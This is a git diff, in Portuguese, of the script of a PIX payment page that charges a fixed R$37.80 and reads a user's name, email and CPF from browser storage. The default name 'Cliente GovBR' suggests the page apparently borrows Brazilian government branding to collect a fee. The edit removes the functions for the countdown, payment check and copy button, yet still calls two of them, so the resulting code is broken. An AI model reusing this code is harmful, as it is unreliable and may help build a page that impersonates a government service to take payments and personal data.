@@ -399,15 +399,18 @@
         </footer>
     </div>
 
-    <script>
+  <script>
         // Variáveis globais
         let paymentId;
         let checkInterval;
         let loadingTimeout;
         const paymentAmount = 37.80;
-       const backendUrl = window.location.hostname === 'localhost' 
-    ? 'http://localhost:5000' 
-    : window.location.origin;
+        
+        // URL dinâmica para produção/desenvolvimento
+        const backendUrl = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
+            ? 'http://localhost:5000' 
+            : 'https://seu-app-railway.up.railway.app'; // SUBSTITUA PELA SUA URL REAL
+
         // Elementos DOM
         const loadingElement = document.getElementById('loading-pix');
         const pixContentElement = document.getElementById('pix-content');
@@ -418,31 +421,6 @@
         const paymentConfirmed = document.getElementById('payment-confirmed');
         const errorContainer = document.getElementById('error-container');
         const connectionAlert = document.getElementById('connection-alert');
-
-        // Verificar conexão com a internet
-        function checkConnection() {
-            if (!navigator.onLine) {
-                showConnectionError();
-                return false;
-            }
-            connectionAlert.style.display = 'none';
-            return true;
-        }
-
-        function showConnectionError() {
-            connectionAlert.style.display = 'flex';
-            loadingElement.style.display = 'none';
-            pixContentElement.style.display = 'none';
-            clearTimeout(loadingTimeout);
-        }
-
-        // Monitorar mudanças na conexão
-        window.addEventListener('online', () => {
-            connectionAlert.style.display = 'none';
-            generatePix();
-        });
-
-        window.addEventListener('offline', showConnectionError);
 
         // Função para exibir erros
         function showError(message, details = null) {
@@ -456,131 +434,21 @@
             errorContainer.style.display = 'block';
             loadingElement.style.display = 'none';
             pixContentElement.style.display = 'none';
-            console.error('Erro:', message, details);
-        }
-
-        // Função para copiar código PIX
-        function copyPixCode() {
-            const code = pixCodeText.textContent.trim();
-            navigator.clipboard.writeText(code)
-                .then(() => {
-                    alert('Código PIX copiado! Cole no seu aplicativo bancário.');
-                    console.log('Código PIX copiado:', code.substring(0, 20) + '...');
-                })
-                .catch((err) => {
-                    const textarea = document.createElement('textarea');
-                    textarea.value = code;
-                    document.body.appendChild(textarea);
-                    textarea.select();
-                    const success = document.execCommand('copy');
-                    document.body.removeChild(textarea);
-                    
-                    if (success) {
-                        alert('Código copiado!');
-                    } else {
-                        showError('Falha ao copiar código. Tente manualmente.');
-                        console.error('Falha ao copiar código:', err);
-                    }
-                });
-        }
-
-        // Contador regressivo
-        function startCountdown(expirationDate) {
-            const updateTimer = () => {
-                const now = new Date();
-                const diff = expirationDate - now;
-                
-                if (diff <= 0) {
-                    clearInterval(checkInterval);
-                    showError('Tempo esgotado! Por favor, inicie um novo pagamento.');
-                    console.log('Tempo de pagamento expirado');
-                    return;
-                }
-                
-                const minutes = Math.floor(diff / 60000);
-                const seconds = Math.floor((diff % 60000) / 1000);
-                
-                countdownElement.textContent = 
-                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                
-                document.getElementById('tempo-restante').textContent = 
-                    `${minutes} minuto${minutes !== 1 ? 's' : ''}`;
-            };
-            
-            updateTimer();
-            return setInterval(updateTimer, 1000);
-        }
-
-        // Verificação do pagamento
-        function startPaymentCheck() {
-            console.log('Iniciando verificação de pagamento para ID:', paymentId);
-            
-            checkInterval = setInterval(async () => {
-                try {
-                    console.log('Verificando status do pagamento...');
-                    const response = await fetch(`${backendUrl}/verificar-pagamento/${paymentId}`, {
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        }
-                    });
-                    
-                    if (!response.ok) {
-                        throw new Error(`Erro HTTP: ${response.status}`);
-                    }
-                    
-                    const data = await response.json();
-                    console.log('Status do pagamento:', data.status);
-                    
-                    if (data.status === 'approved') {
-                        clearInterval(checkInterval);
-                        paymentConfirmed.style.display = 'block';
-                        localStorage.setItem('paymentStatus', 'approved');
-                        
-                        console.log('Pagamento aprovado, redirecionando...');
-                        setTimeout(() => {
-                            window.location.href = "confirmacao.html";
-                        }, 2000);
-                    }
-                } catch (error) {
-                    console.error('Erro ao verificar pagamento:', error);
-                    showError('Falha ao verificar pagamento. Tentando novamente...', error.message);
-                }
-            }, 5000);
         }
 
         // Função principal para gerar PIX
         async function generatePix() {
-            if (!checkConnection()) return;
-
             // Limpar estados anteriores
             clearTimeout(loadingTimeout);
             errorContainer.style.display = 'none';
-            loadingElement.innerHTML = `
-                <div class="spinner"></div>
-                <p>Gerando seu código PIX...</p>
-            `;
             loadingElement.style.display = 'block';
             pixContentElement.style.display = 'none';
             paymentConfirmed.style.display = 'none';
-
-            // Timeout para evitar carregamento infinito
-            loadingTimeout = setTimeout(() => {
-                showError('O servidor está demorando muito para responder. Tente novamente.');
-            }, 15000); // 15 segundos
 
             try {
                 const userEmail = localStorage.getItem('userEmail') || 'cliente@exemplo.com';
                 const userName = localStorage.getItem('userName') || 'Cliente GovBR';
                 const userCPF = localStorage.getItem('userCPF') || '';
-                
-                console.log('Enviando requisição PIX para:', `${backendUrl}/gerar-pix`);
-                console.log('Dados enviados:', {
-                    email: userEmail,
-                    nome: userName,
-                    cpf: userCPF,
-                    valor: paymentAmount
-                });
                 
                 const response = await fetch(`${backendUrl}/gerar-pix`, {
                     method: 'POST',
@@ -596,23 +464,17 @@
                     })
                 });
 
+                // Verifica se a resposta é JSON
+                const contentType = response.headers.get('content-type');
+                if (!contentType || !contentType.includes('application/json')) {
+                    const text = await response.text();
+                    throw new Error(`Resposta inválida do servidor: ${text.substring(0, 100)}`);
+                }
+
                 const data = await response.json();
                 
                 if (!response.ok || !data.success) {
-                    const errorMsg = data.error || 'Falha ao gerar PIX';
-                    const errorDetails = data.details || `Status HTTP: ${response.status}`;
-                    throw new Error(`${errorMsg} (${errorDetails})`);
-                }
-
-                // Verificação mais robusta dos dados
-                if (!data.qr_base64) {
-                    throw new Error('QR Code não foi gerado pelo servidor');
-                }
-                if (!data.pix_code) {
-                    throw new Error('Código PIX não foi gerado pelo servidor');
-                }
-                if (!data.payment_id) {
-                    throw new Error('ID do pagamento não foi retornado');
+                    throw new Error(data.error || 'Falha ao gerar PIX');
                 }
 
                 paymentId = data.payment_id;
@@ -625,18 +487,15 @@
                 loadingElement.style.display = 'none';
                 pixContentElement.style.display = 'block';
                 
-                // Iniciar contagem regressiva e verificação
+                // Iniciar contagem regressiva
                 startCountdown(expirationDate);
                 startPaymentCheck();
 
             } catch (error) {
-                console.error('Erro detalhado:', error);
                 showError(
                     error.message || 'Falha ao gerar cobrança PIX', 
-                    error.details || 'Tente novamente ou entre em contato com o suporte'
+                    'Tente novamente ou entre em contato com o suporte'
                 );
-            } finally {
-                clearTimeout(loadingTimeout);
             }
         }
 
